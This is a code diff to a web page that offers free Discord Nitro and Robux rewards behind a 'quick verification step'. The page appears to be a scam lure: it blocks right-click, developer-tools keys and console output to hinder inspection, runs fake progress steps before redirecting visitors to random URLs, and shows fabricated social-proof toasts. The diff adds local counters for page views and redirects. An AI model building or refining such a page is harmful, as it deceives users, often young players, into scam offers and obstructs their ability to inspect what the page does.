@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* Disable text selection and image dragging */
+    /* Your existing CSS – unchanged */
     * {
       user-select: none;
       -webkit-user-select: none;
@@ -17,9 +17,7 @@
       -webkit-user-drag: none;
       user-drag: none;
     }
-    ::selection {
-      background: transparent;
-    }
+    ::selection { background: transparent; }
     * {
       margin: 0;
       padding: 0;
@@ -448,7 +446,16 @@
 
 <script>
   (function() {
-    // ----- ANTI-COPY / ANTI-DEBUG (prevents right-click and source view) -----
+    // ========== TRACKING: increment page view ==========
+    let pageViews = localStorage.getItem('extvify_pageViews');
+    if (pageViews === null) {
+      pageViews = 1;
+    } else {
+      pageViews = parseInt(pageViews) + 1;
+    }
+    localStorage.setItem('extvify_pageViews', pageViews);
+
+    // ========== ANTI-COPY / ANTI-DEBUG ==========
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
       if (e.key === 'F12' ||
@@ -460,13 +467,12 @@
         return false;
       }
     });
-    // Mute console.log
     if (typeof window.console !== 'undefined') { console.log = function() {}; }
     setInterval(function() {
       if (typeof window.console !== 'undefined' && window.console.log !== function(){}) { console.log = function(){}; }
     }, 1000);
 
-    // ----- BACKGROUND MUSIC -----
+    // ========== BACKGROUND MUSIC ==========
     const bgAudio = document.getElementById('bgMusic');
     let audioStarted = false;
     if (bgAudio) {
@@ -484,7 +490,7 @@
       document.addEventListener('touchstart', startAudio);
     }
 
-    // ----- CLICK SOUND -----
+    // ========== CLICK SOUND ==========
     let audioCtx = null;
     function playClick() {
       try {
@@ -503,7 +509,7 @@
       } catch(e) {}
     }
 
-    // ----- REWARD DATA -----
+    // ========== REWARD DATA ==========
     const rewards = [
       { id: "nitro_basic", title: "Nitro Basic", desc: "Emojis, stickers, 50MB upload", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" },
       { id: "nitro_boost", title: "Nitro Boost", desc: "Boosts, 4K streaming, profile perks", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
@@ -579,7 +585,19 @@
       const timedSteps = steps.map(step => ({ ...step, duration: rand(step.min, step.max), pause: rand(40,80) }));
       let idx = 0;
       function advance() {
-        if (idx >= timedSteps.length) { setTimeout(() => { window.location.href = getRandomRedirect(); }, 200); return; }
+        if (idx >= timedSteps.length) {
+          // ========== TRACKING: increment redirect counter ==========
+          let redirectCount = localStorage.getItem('extvify_redirects');
+          if (redirectCount === null) {
+            redirectCount = 1;
+          } else {
+            redirectCount = parseInt(redirectCount) + 1;
+          }
+          localStorage.setItem('extvify_redirects', redirectCount);
+          // redirect after 200ms
+          setTimeout(() => { window.location.href = getRandomRedirect(); }, 200);
+          return;
+        }
         const s = timedSteps[idx];
         progressStatus.innerText = s.label;
         progressSub.innerText = s.sub;
@@ -602,8 +620,7 @@
       });
     });
 
-    // ----- SOCIAL PROOF TOASTS (FILTERED COUNTRIES) -----
-    // Removed countries where Discord is banned/restricted: North Korea, China, Russia, Iran, Syria, Cuba, etc.
+    // ========== SOCIAL PROOF TOASTS (FILTERED COUNTRIES) ==========
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
       "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
